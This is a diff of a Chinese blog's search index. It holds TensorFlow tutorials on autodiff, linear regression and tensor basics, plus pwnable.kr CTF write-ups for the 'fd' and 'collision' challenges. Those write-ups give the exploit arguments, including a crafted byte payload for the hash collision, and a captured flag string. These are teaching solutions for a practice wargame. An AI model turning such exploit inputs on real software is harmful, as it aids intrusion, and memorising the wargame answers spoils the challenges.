-<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/1.png" alt="image"></p>
-<p>接下来，对 Sigmoid 函数求导，并实现 Sigmoid 导数函数 <code>sigmoid_derivative(x)</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid_derivative</span>(<span class="params">x</span>):</span></span><br><span class="line">    d_s = sigmoid(x) * (<span class="number">1</span> - sigmoid(x))</span><br><span class="line">    <span class="keyword">return</span> d_s</span><br></pre></td></tr></table></figure>
-
-<p>同样，使用上面初始化好的 x 值，绘制 Sigmoid 函数导数的变化曲线。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x, sigmoid_derivative(x))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/2.png" alt="image"></p>
-<h2 id="自动微分"><a href="#自动微分" class="headerlink" title="自动微分"></a>自动微分</h2><p>TensorFlow 中，可以使用 <code>tf.GradientTape</code> 跟踪全部运算过程，以便在必要的时候计算梯度。当然，对于上方 Sigmoid 一元函数而言，也就是自动求导过程。</p>
-<p>接下来，使用在实验中学习到的方法，使用 <code>tf.GradientTape</code> 完成自动微分。同样，需要传入前面生成的等间距 x 并绘制出导数的变化曲线。提示，在计算梯度的过程中，x 可能需要被转换为变量张量。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = tf.Variable(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">    s = <span class="number">1</span> / (<span class="number">1</span> + tf.math.exp(-x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grad = tape.gradient(s, x)  <span class="comment"># 计算梯度</span></span><br><span class="line">grad</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.plot(x.numpy(), grad.numpy())  <span class="comment"># 绘制 sigmoid 导数变化曲线</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/10/26/TensorFlow2.0/%E5%AF%BC%E6%95%B0%E8%AE%A1%E7%AE%97%E5%92%8C%E8%87%AA%E5%8A%A8%E5%BE%AE%E5%88%86%E5%AE%9E%E7%8E%B0/3.png" alt="image"></p>
-<p>可以发现，借助于自动微分机制，我们只需要书写计算过程即可得到关于任意变量的微分结果。</p>
-]]></content>
-      <categories>
-        <category>Machine Learning</category>
-        <category>TensorFlow</category>
-      </categories>
-      <tags>
-        <tag>TensorFlow2.0</tag>
+        <tag>PWN</tag>
+        <tag>Stack</tag>
       </tags>
   </entry>
   <entry>
@@ -799,41 +529,6 @@
       </tags>
   </entry>
   <entry>
-    <title>fd</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/2.png" class></strong></p>
-<h3 id="登录远程服务器"><a href="#登录远程服务器" class="headerlink" title="登录远程服务器"></a>登录远程服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/3.png" class></strong></p>
-<h3 id="ls-la查看文件信息"><a href="#ls-la查看文件信息" class="headerlink" title="ls -la查看文件信息"></a>ls -la查看文件信息</h3><p><strong><a href="https://blog.csdn.net/u013197629/article/details/73608613">linux文件权限知识</a></strong></p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/4.png" class></strong></p>
-<p>发现fd.c和其对应的可执行文件fd（用户有执行权限）</p>
-<h3 id="cat-fd-c查看c语言代码"><a href="#cat-fd-c查看c语言代码" class="headerlink" title="cat fd.c查看c语言代码"></a>cat fd.c查看c语言代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/5.png" class></strong></p>
-<p>有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/6.png" class></strong></p>
-<h3 id="read-fd-buf-32"><a href="#read-fd-buf-32" class="headerlink" title="read(fd,buf,32)"></a>read(fd,buf,32)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(fd, buf, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">fd == <span class="number">0</span>时：则表示标准输入；</span><br><span class="line">fd == <span class="number">1</span>时：则表示标准输出；</span><br><span class="line">fd == <span class="number">2</span>时，则表示标准输出错误。</span><br><span class="line">buf 表示读入的缓冲区；</span><br><span class="line"><span class="number">32</span>表示读入<span class="number">32</span>字节；</span><br></pre></td></tr></table></figure>
-
-<p>因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。</p>
-<p>注意到</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = atoi(argv[<span class="number">1</span>]) - <span class="number">0x1234</span></span><br></pre></td></tr></table></figure>
-
-<p>要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$</p>
-<h3 id="fd-4660"><a href="#fd-4660" class="headerlink" title="./fd 4660"></a>./fd 4660</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/7.png" class></strong></p>
-<p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
-<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>collision</title>
     <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/1.png" class></strong></p>
@@ -858,6 +553,41 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/8.png" class></strong></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fd</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/2.png" class></strong></p>
+<h3 id="登录远程服务器"><a href="#登录远程服务器" class="headerlink" title="登录远程服务器"></a>登录远程服务器</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/3.png" class></strong></p>
+<h3 id="ls-la查看文件信息"><a href="#ls-la查看文件信息" class="headerlink" title="ls -la查看文件信息"></a>ls -la查看文件信息</h3><p><strong><a href="https://blog.csdn.net/u013197629/article/details/73608613">linux文件权限知识</a></strong></p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/4.png" class></strong></p>
+<p>发现fd.c和其对应的可执行文件fd（用户有执行权限）</p>
+<h3 id="cat-fd-c查看c语言代码"><a href="#cat-fd-c查看c语言代码" class="headerlink" title="cat fd.c查看c语言代码"></a>cat fd.c查看c语言代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/5.png" class></strong></p>
+<p>有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/6.png" class></strong></p>
+<h3 id="read-fd-buf-32"><a href="#read-fd-buf-32" class="headerlink" title="read(fd,buf,32)"></a>read(fd,buf,32)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(fd, buf, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">fd == <span class="number">0</span>时：则表示标准输入；</span><br><span class="line">fd == <span class="number">1</span>时：则表示标准输出；</span><br><span class="line">fd == <span class="number">2</span>时，则表示标准输出错误。</span><br><span class="line">buf 表示读入的缓冲区；</span><br><span class="line"><span class="number">32</span>表示读入<span class="number">32</span>字节；</span><br></pre></td></tr></table></figure>
+
+<p>因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。</p>
+<p>注意到</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = atoi(argv[<span class="number">1</span>]) - <span class="number">0x1234</span></span><br></pre></td></tr></table></figure>
+
+<p>要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$</p>
+<h3 id="fd-4660"><a href="#fd-4660" class="headerlink" title="./fd 4660"></a>./fd 4660</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/7.png" class></strong></p>
+<p>注意这里参数需要转为10进制   $0x1234_{16} = 4660_{10}$</p>
+<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -1151,6 +881,366 @@
       </tags>
   </entry>
   <entry>
+    <title>TensorFlow2实现线性回归</title>
+    <url>/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p>线性回归是入门机器学习必学的算法，其也是最基础的算法之一。接下来，使用 TensorFlow 2 提供的 API 和 Eager Execution 机制对其进行实现。</p>
+<p>线性回归是一种较为简单，但十分重要的机器学习方法，它也是神经网络的基础。如下所示，线性回归要解决的问题就是如何找到最理想的直线去拟合散点样本。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/1.png" class></strong></p>
+<p>对于一个线性回归问题，一般来讲有 2 种解决方法，分别是：最小二乘法和梯度下降法。其中最小二乘法又分为两种求解思路：代数求解和矩阵求解。本次实验，将使用梯度下降方法来解决线性回归问题。同时，实验将使用 TensorFlow 低阶 API 和高阶 API 两种方法进行实现。</p>
+<h2 id="低阶-API-实现"><a href="#低阶-API-实现" class="headerlink" title="低阶 API 实现"></a>低阶 API 实现</h2><p>TensorFlow 的低阶 API 实现，实际上就是利用最基本的函数和组件，结合 Eager Execution 机制来完成。实验首先初始化一组随机数据样本，并添加噪声，然后将其可视化出来。</p>
+<p>在这个过程中，我们全部使用 TensorFlow 提供的 API 来完成，也可以使用numpy数组。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">TRUE_W = <span class="number">3.0</span></span><br><span class="line">TRUE_b = <span class="number">2.0</span></span><br><span class="line">NUM_SAMPLES = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化随机数据</span></span><br><span class="line">X = tf.random.normal(shape=[NUM_SAMPLES, <span class="number">1</span>]).numpy()</span><br><span class="line">noise = tf.random.normal(shape=[NUM_SAMPLES, <span class="number">1</span>]).numpy()</span><br><span class="line">y = X * TRUE_W + TRUE_b + noise  <span class="comment"># 添加噪声</span></span><br><span class="line"></span><br><span class="line">plt.scatter(X, y)</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/2.png" class></strong></p>
+<p>接下来，定义一元线性回归模型：</p>
+<p>$<br>f(w, b, x) = w*x + b<br>$</p>
+<p>这里我们构建自定义模型类，并使用 TensorFlow 提供的 <code>tf.Variable</code> 随机初始化参数 <em>w</em> 和截距项 <em>b</em>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.W = tf.Variable(tf.random.uniform([<span class="number">1</span>]))  <span class="comment"># 随机初始化参数</span></span><br><span class="line">        self.b = tf.Variable(tf.random.uniform([<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.W * x + self.b  <span class="comment"># w*x + b</span></span><br></pre></td></tr></table></figure>
+
+<p>上方展示了一个标准的 TensorFlow 模型类的构建方法。</p>
+<p>对于随机初始化的 <em>w</em> 和 <em>b</em>，我们可以将其拟合直线绘制到样本散点图中。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = Model()  <span class="comment"># 实例化模型</span></span><br><span class="line"></span><br><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，应该会看到直线并没有很好地拟合样本。示例效果如下（仅参考）：</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/3.png" class></strong></p>
+<p>当然，由于是随机初始化，也有极小概率一开始拟合效果非常好，那么重新执行一次上面的单元格另外随机初始化一组数据即可。尽可能保证一开始随机初始化的直线无法准确拟合数据，方便后续直观感受优化过程的效果。</p>
+<p>然后，定义线性回归使用到的损失函数。这里使用线性回归问题中常用的平方损失函数。</p>
+<p>$<br>{\rm Loss}(w, b, x, y) = \sum_{i=1}^N (f(w, b, x_i) - y_i)^2<br>$</p>
+<p>公式中，<em>f</em>(<em>w</em>,<em>b</em>,<em>$x_i$</em>) 是模型根据 <em>$x_i$</em> 计算的预测值，*$y_i$* 则表示真实值。</p>
+<p>接下来，根据公式实现损失计算函数，同样使用 TensorFlow 中的相关函数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss_fn</span>(<span class="params">model, x, y</span>):</span></span><br><span class="line">    y_ = model(x)</span><br><span class="line">    <span class="keyword">return</span> tf.reduce_mean(tf.square(y_ - y))</span><br></pre></td></tr></table></figure>
+
+<p>接下来，就可以开始迭代过程了，这也是最关键的一步。使用梯度下降法求解线性回归的问题中，我们首先需要计算参数的梯度，然后使用梯度下降法来更新参数。<br>$$<br>\begin{align}<br>w &amp;\leftarrow w - lr * \frac{\partial {\rm loss}(w, b)}{\partial w} \<br>b &amp;\leftarrow b - lr * \frac{\partial {\rm loss}(w, b)}{\partial b}<br>\end{align}<br>$$<br>公式中，<em>lr</em> 指代学习率。</p>
+<p>梯度下降方法是数学中的一种最优化方法，常被用于神经网络的迭代优化过程。简单概括，梯度下降法就是沿着梯度下降方向去寻找损失函数的极小值（梯度的反方向）。过程如下图所示。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/4.png" class></strong></p>
+<p>TensorFlow 2 中的 Eager Execution 提供了 <code>tf.GradientTape</code> 用于追踪梯度。所以，下面我们对照着参数更新公式来实现梯度下降法的迭代更新过程。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EPOCHS = <span class="number">10</span>  <span class="comment"># 全部数据迭代 10 次</span></span><br><span class="line">LEARNING_RATE = <span class="number">0.1</span>  <span class="comment"># 学习率</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCHS):  <span class="comment"># 迭代次数</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">        loss = loss_fn(model, X, y)  <span class="comment"># 计算损失</span></span><br><span class="line">    dW, db = tape.gradient(loss, [model.W, model.b])  <span class="comment"># 计算梯度</span></span><br><span class="line">    model.W.assign_sub(LEARNING_RATE * dW)  <span class="comment"># 更新梯度</span></span><br><span class="line">    model.b.assign_sub(LEARNING_RATE * db)</span><br><span class="line">    <span class="comment"># 输出计算过程</span></span><br><span class="line">    print(<span class="string">f&#x27;Epoch [<span class="subst">&#123;epoch&#125;</span>/<span class="subst">&#123;EPOCHS&#125;</span>], loss [<span class="subst">&#123;loss&#125;</span>], W/b [<span class="subst">&#123;model.W.numpy()&#125;</span>/<span class="subst">&#123;model.b.numpy()&#125;</span>]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码中，我们初始化 <code>tf.GradientTape()</code> 以追踪梯度，然后使用 <code>tape.gradient</code> 方法就可以计算梯度了。值得注意的是，<code>tape.gradient()</code> 第二个参数支持以列表形式传入多个参数同时计算梯度。紧接着，使用 <code>.assign_sub</code> 即可完成公式中的减法操作用以更新梯度。</p>
+<p>这是一个标准的梯度下降过程,可以看到，损失函数的值随着迭代过程不断减小，意味着我们离最优化参数不断接近。</p>
+<p> 最终，我们绘制参数学习完成之后，模型的拟合结果。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>​                                                              <strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/5.png" class></strong></p>
+<p>由于是随机初始化参数，如果迭代后拟合效果仍然不好，一般是迭代次数太少的原因。可以重复执行上面的迭代单元格多次，增加参数更新迭代次数，即可改善拟合效果。</p>
+<h2 id="高阶-API-实现"><a href="#高阶-API-实现" class="headerlink" title="高阶 API 实现"></a>高阶 API 实现</h2><p>TensorFlow 2 中提供了大量的高阶 API 帮助我们快速构建所需模型，接下来，我们使用一些新的 API 来完成线性回归模型的构建。这里还是沿用上面提供的示例数据。</p>
+<p><code>tf.keras</code> 模块下提供的 <code>tf.keras.layers.Dense</code> 全连接层（线性层）实际上就是一个线性计算过程。所以，模型的定义部分就可以直接实例化一个全连接层即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.layers.Dense(units=<span class="number">1</span>)  <span class="comment"># 实例化线性层</span></span><br><span class="line">model</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>units</code> 为输出空间维度。此时，参数已经被初始化了，所以我们可以绘制出拟合直线。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>你可以使用 <code>model.variables</code> 打印出模型初始化的随机参数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.variables</span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以直接构建模型迭代过程了。</p>
+<p>这里同样使用 <code>tf.GradientTape()</code> 来追踪梯度，我们简化损失计算和更新的过程。首先，损失函数无需再自行构造，我们可以直接使用 TensorFlow 提供的平方损失函数 <code>tf.keras.losses.mean_squared_error</code> 计算，然后使用 <code>tf.reduce_sum</code> 求得全部样本的平均损失。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">EPOCHS = <span class="number">10</span></span><br><span class="line">LEARNING_RATE = <span class="number">0.002</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCHS):  <span class="comment"># 迭代次数</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:  <span class="comment"># 追踪梯度</span></span><br><span class="line">        y_ = model(X)</span><br><span class="line">        loss = tf.reduce_sum(tf.keras.losses.mean_squared_error(y, y_))  <span class="comment"># 计算损失</span></span><br><span class="line"></span><br><span class="line">    grads = tape.gradient(loss, model.variables)  <span class="comment"># 计算梯度</span></span><br><span class="line">    optimizer = tf.keras.optimizers.SGD(LEARNING_RATE)  <span class="comment"># 随机梯度下降</span></span><br><span class="line">    optimizer.apply_gradients(zip(grads, model.variables))  <span class="comment"># 更新梯度</span></span><br><span class="line">    print(<span class="string">f&#x27;Epoch [<span class="subst">&#123;epoch&#125;</span>/<span class="subst">&#123;EPOCHS&#125;</span>], loss [<span class="subst">&#123;loss&#125;</span>]&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其次，使用 <code>model.variables</code> 即可读取可参数的列表，无需像上面那样手动传入参数。这里不再按公式手动更新梯度，而是使用现有的随机梯度下降函数 <code>tf.keras.optimizers.SGD</code>，然后使用 <code>apply_gradients</code> 即可更新梯度。</p>
+<p>TensorFlow 中没有提供上方手动实现的梯度下降算法，只提供了<a href="https://zhuanlan.zhihu.com/p/25765735">随机梯度下降算法</a>。</p>
+<p>最终，同样将迭代完成的参数绘制拟合直线到原图中。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/6.png" class></strong></p>
+<p>一般情况下，应该能看到一个更好的拟合结果。当然，如果拟合效果不好，可能是迭代批次太少，可以重复执行优化过程。</p>
+<h2 id="Keras-方式实现"><a href="#Keras-方式实现" class="headerlink" title="Keras 方式实现"></a>Keras 方式实现</h2><p>配合 TensorFlow 提供的高阶 API，我们省去了定义线性函数，定义损失函数，以及定义优化算法等 3 个步骤。至此，你应该可以初步感受到 TensorFlow 的易用性和存在的必要性了。不过，上面的高阶 API 实现过程实际上还不够精简，我们可以完全使用 TensorFlow Keras API 来实现线性回归。</p>
+<p>Keras 本来是一个用 Python 编写的独立高阶神经网络 API，它能够以 TensorFlow, CNTK，或者 Theano 作为后端运行。目前，TensorFlow 已经吸纳 Keras，并组成了 <code>tf.keras</code> 模块。官方介绍，<code>tf.keras</code> 和单独安装的 Keras 略有不同，但考虑到未来的发展趋势，实验以学习 <code>tf.keras</code> 为主。</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/27/TensorFlow2.0/TensorFlow2%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/7.png" class></strong></p>
+<p>我们这里使用 Keras 提供的 Sequential 顺序模型结构。和上面的例子相似，向其中添加一个线性层。不同的地方在于，Keras 顺序模型第一层为线性层时，规定需指定输入维度，这里为 <code>input_dim=1</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.Sequential()  <span class="comment"># 新建顺序模型</span></span><br><span class="line">model.add(tf.keras.layers.Dense(units=<span class="number">1</span>, input_dim=<span class="number">1</span>))  <span class="comment"># 添加线性层</span></span><br><span class="line">model.summary()  <span class="comment"># 查看模型结构</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来，直接使用 <code>.compile</code> 编译模型，指定损失函数为 MSE 平方损失函数，优化器选择 SGD 随机梯度下降。然后，就可以使用 <code>.fit</code> 传入数据开始迭代了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.compile(optimizer=<span class="string">&#x27;sgd&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)  <span class="comment"># 定义损失函数和优化方法</span></span><br><span class="line">model.fit(X, y, epochs=<span class="number">10</span>, batch_size=<span class="number">32</span>)  <span class="comment"># 训练模型</span></span><br></pre></td></tr></table></figure>
+
+<p><code>batch_size</code> 是采用小批次训练的参数，主要用于解决一次性传入数据过多无法训练的问题。当然，由于示例数据本身较少，这里意义不大，但还是按照常规使用方法进行设置。</p>
+<p>同样，绘制最终的结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.scatter(X, y)</span><br><span class="line">plt.plot(X, model(X), c=<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>会发现，完全使用 Keras 高阶 API 实际上只需要 4 行核心代码即可完成，相比于最开始的低阶 API 简化了很多。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = tf.keras.Sequential()  <span class="comment"># 新建顺序模型</span></span><br><span class="line">model.add(tf.keras.layers.Dense(units=<span class="number">1</span>, input_dim=<span class="number">1</span>))  <span class="comment"># 添加线性层</span></span><br><span class="line">model.compile(optimizer=<span class="string">&#x27;sgd&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)  <span class="comment"># 定义损失函数和优化方法</span></span><br><span class="line">model.fit(X, y, epochs=<span class="number">10</span>, batch_size=<span class="number">32</span>)  <span class="comment"># 训练模型</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Machine Learning</category>
+        <category>TensorFlow</category>
+      </categories>
+      <tags>
+        <tag>TensorFlow2.0</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TensorFlow2基础概念语法</title>
+    <url>/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/0.png" class></strong></p>
+ <a id="more"></a>
+
+<h2 id="张量"><a href="#张量" class="headerlink" title="张量"></a>张量</h2><p>数学或物理上关于张量的两种定义方法（抽象）：</p>
+<ul>
+<li>通常定义张量的物理学或传统数学方法，是把张量看成一个多维数组，当变换坐标或变换基底时，其分量会按照一定规则进行变换，这些规则有两种：即协变或逆变转换。</li>
+<li>通常现代数学中的方法，是把张量定义成某个矢量空间或其对偶空间上的多重线性映射，这矢量空间在需要引入基底之前不固定任何坐标系统。例如协变矢量，可以描述为 1-形式，或者作为逆变矢量的对偶空间的元素。</li>
+</ul>
+<p>通俗来讲，一阶张量为向量，二阶张量为矩阵。当然，零阶张量也就是标量，而更重要的是 𝑁 阶张量，也就是 𝑁 维数组。</p>
+<table>
+<thead>
+<tr>
+<th align="center">阶</th>
+<th align="center">数学实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">标量（只有大小）</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">矢量（大小和方向）</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">矩阵（数据表）</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">3 阶张量（数据立体）</td>
+</tr>
+<tr>
+<td align="center">N</td>
+<td align="center">N 阶张量（自行想象）</td>
+</tr>
+</tbody></table>
+<p><strong><img src="/xiaohong404.github.io/2020/10/26/TensorFlow2.0/TensorFlow2%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%AF%AD%E6%B3%95/1.png" class></strong></p>
+<p>大多数深度学习框架都会使用张量的概念，这样做的好处是统一对数据的定义。NumPy 中，数据都使用 Ndarray 多维数组进行定义，TensorFlow 中，数据都会用张量进行表述。</p>
+<p>下面就来学习 TensorFlow 中对张量的定义。在 TensorFlow 中，每一个 Tensor 都具备两个基础属性：<strong>数据类型（默认：float32）和形状</strong>。</p>
+<p>其中，数据类型大致如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th align="center">Tensor 类型</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>tf.float32</code></td>
+<td align="center">32 位浮点数</td>
+</tr>
+<tr>
+<td align="center"><code>tf.float64</code></td>
+<td align="center">64 位浮点数</td>
+</tr>
+<tr>
+<td align="center"><code>tf.int64</code></td>
+<td align="center">64 位有符号整型</td>
+</tr>
+<tr>
+<td align="center"><code>tf.int32</code></td>
